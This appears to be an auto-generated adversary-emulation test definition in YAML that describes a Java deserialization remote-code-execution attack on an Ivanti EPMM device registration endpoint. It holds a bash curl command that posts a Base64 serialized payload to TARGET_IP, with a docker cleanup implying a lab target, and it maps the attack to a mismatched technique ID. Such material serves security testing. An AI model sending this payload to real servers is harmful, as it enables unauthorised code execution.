# Auto-generated by CIPHER v5.0
# Source: ea2a7bfa37f6
attack_technique: T1059.001
display_name: "T1059.001 - Java Deserialization via Ivanti EPMM deviceFingerprint"
atomic_tests:
  - name: "T1059.001 - Java Deserialization via Ivanti EPMM deviceFingerprint"
    description: |
      Send a crafted Base64‑encoded serialized object to the vulnerable `/api/v1/device/register` endpoint to achieve remote code execution.
    supported_platforms:
      - linux
    executor:
      name: bash
      command: |
        payload=$(cat payload.double.b64); json=$(printf '{"deviceFingerprint":"%s"}' "$payload"); curl -s -X POST -H "Content-Type: application/json" -d "$json" http://TARGET_IP:8080/api/v1/device/register
      cleanup_command: |
        docker rm -f epmm-vuln || true
